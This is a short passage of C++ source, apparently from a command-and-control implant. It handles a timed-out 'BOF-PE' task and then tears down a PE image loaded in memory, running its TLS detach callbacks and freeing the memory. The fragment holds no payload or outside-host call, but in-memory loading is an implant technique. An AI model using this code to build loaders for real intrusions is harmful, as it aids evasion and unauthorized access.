        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "BOF-PE timed out" ) ) );
    }

    // Cleanup
    if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
    inst.coff = {};

    // Call TLS callbacks for DLL_PROCESS_DETACH before freeing
    if ( nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_TLS &&
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size > 0 ) {
        auto tls = reinterpret_cast<PE_TLS_DIRECTORY64*>(
            image_base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress );
        if ( tls->AddressOfCallBacks ) {
            auto callbacks = reinterpret_cast<uint64_t*>( tls->AddressOfCallBacks );
            while ( *callbacks ) {
                typedef void ( WINAPI *tls_callback_t )( PVOID, DWORD, PVOID );
                auto cb = reinterpret_cast<tls_callback_t>( *callbacks );
                cb( image_base, DLL_PROCESS_DETACH, nullptr );
                callbacks++;
            }
        }
    }

    inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
}

#endif
